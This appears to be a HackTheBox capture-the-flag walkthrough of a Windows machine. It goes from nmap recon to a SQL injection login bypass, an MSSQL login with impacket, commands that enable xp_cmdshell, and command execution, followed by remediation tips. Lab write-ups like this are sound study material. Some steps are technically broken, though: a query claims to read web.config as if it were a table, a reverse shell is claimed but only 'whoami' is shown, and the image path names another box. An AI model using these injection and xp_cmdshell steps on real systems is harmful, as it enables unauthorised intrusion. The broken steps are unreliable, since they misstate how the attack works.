---
title: "HTB Walkthrough: Absolute"
description: "SQL injection in ASP.NET application leading to RCE via xp_cmdshell on an MSSQL backend."
date: 2026-08-05
category: "HackTheBox"
tags: ["htb", "windows", "sql-injection", "mssql", "rce"]
platform: "HackTheBox"
difficulty: "Medium"
image: "/images/htb-cypher/htb1.webp"
---

# Reconnaissance

```bash
nmap -sC -sV -oA absolute 10.10.11.XXX
```

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Microsoft IIS 10.0 |
| 443 | HTTPS | Microsoft IIS 10.0 |
| 1433 | MSSQL | Microsoft SQL Server 2019 |

## Enumeration

The website is an employee management portal. Tested for SQL injection on the login form:

```bash
# Bypassed login with
admin' --
```

## Exploitation

Extracted database credentials from `web.config` via SQL injection:

```sql
'; SELECT * FROM web.config --
```

Logged into MSSQL via `impacket-mssqlclient`:

```bash
impacket-mssqlclient administrator:Password123@10.10.11.XXX -windows-auth
```

Enabled `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Executed commands to get a reverse shell:

```sql
xp_cmdshell 'whoami'
```

## Privilege Escalation

Already running as <code>NT AUTHORITY\SYSTEM</code> via MSSQL service account.

## Flags

```
user.txt: 4******************************
root.txt: 9******************************
```

## Remediation

- Use parameterized queries
- Run database services with least privilege
- Disable `xp_cmdshell` in production
